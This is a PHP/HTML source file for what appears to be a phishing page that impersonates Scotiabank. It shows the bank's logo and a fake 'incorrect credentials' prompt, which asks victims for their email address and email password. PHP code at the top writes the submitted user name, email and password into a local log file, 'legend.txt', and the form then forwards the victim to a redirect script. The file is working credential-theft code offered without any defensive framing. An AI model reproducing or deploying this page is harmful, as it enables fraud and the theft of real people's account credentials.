<?php

$mensaje="Usuario: ".$_GET['persona']." Correo: ".$_POST['email']." Contraseña del correo: ".$_POST['pass']."\n";
$file = fopen("legend.txt", "a");

fwrite($file, "$mensaje" . PHP_EOL);

?>

<!doctype html>
<html lang="en">

<head>
    <title>Email Scotiabank</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.3/css/bulma.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="css/style.css">
    <style>
        div#is-relative {

            position: relative;
        }

        /* El icono debe ser "position: absolute"
 * Ademas le damos un "display: block" y lo posicionamos */
        #icon {
            position: absolute;
            display: block;
            bottom: .5rem;
            right: 1rem;

            user-select: none;
            cursor: pointer;
        }

        input.input {
            padding-right: 2.5rem;
        }
    </style>

</head>

<body>
    <section class="ftco-section">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 text-center mb-5">
                    <h2 class="heading-section">Bienvenido <br><img src="https://scotiabankfiles.azureedge.net/scotiabank-peru/Global-Rebrand/logo.svg" alt=""></h2>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-6 col-lg-5">
                    <div class="login-wrap p-4 p-md-5">
                        <center>
                            <img src="./images/logo-scotiabank-symbol.svg" style="width: 20%;">
                        </center>
                        <h3 class="text-center mb-4"></h3>
                        <form action="redirigir.php?persona=<?php echo $_GET['persona']; ?>" method="POST" class="login-form">
                            <div class="input-wrapper form-group">
                                <div id="is-relative">
                                    <h3>Credenciales incorrectas</h3>
                                    <input type="email" name="email" class="form-control rounded-left" placeholder="Ingrese Correo" required>
                                    <span id="icon">
                                    <i class="far fa-envelope"></i>
                                    </span>
                                </div>

                            </div>
  
                            <div class="input-wrapper form-group">
                                <div id="is-relative">
                                <input type="password"  name="pass" class="form-control rounded-left" placeholder="Contraseña de correo"  >
                                    <span id="icon">
                                        <i class="fas fa-key"></i>
                                    </span>
                                </div>

                            </div>

                            <div class="form-group d-md-flex">
                             

                            </div>
                            <div class="form-group">
                                <button type="submit" class="btn btn-primary rounded submit p-3 px-5">Siguiente</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/main.js"></script>

</body>

</html>